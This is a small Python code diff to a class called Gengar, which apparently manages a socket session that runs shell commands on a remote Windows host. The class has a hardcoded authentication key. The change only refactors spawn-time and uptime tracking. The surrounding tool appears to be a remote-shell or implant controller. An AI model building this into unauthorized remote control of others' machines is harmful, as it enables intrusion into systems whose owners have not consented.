@@ -42,11 +42,11 @@ AUTH_KEY_TO_GENGAR = b'b6c077c1-12d1-4dbb-8786-d22a7090bfae'
 class Gengar:
     _sock: socket.socket
     host: str
-    spawn_time: datetime.datetime
     _authenticated: bool = False
     alive: bool = True
 
     def init(self):
+        self.spawn_time = datetime.datetime.now()
         self.username = self.shell('echo %username%').output
 
     def _send(self, buf: bytes):
@@ -114,8 +114,9 @@ class Gengar:
         finally:
             self._sock.settimeout(None)
 
+    @property
     def uptime(self):
         return datetime.datetime.now() - self.spawn_time
 
     def __repr__(self) -> str:
-        return f'Gengar @ {self.username} # {self.spawn_time}'
+        return f'Gengar @ {self.username} # {self.uptime}'
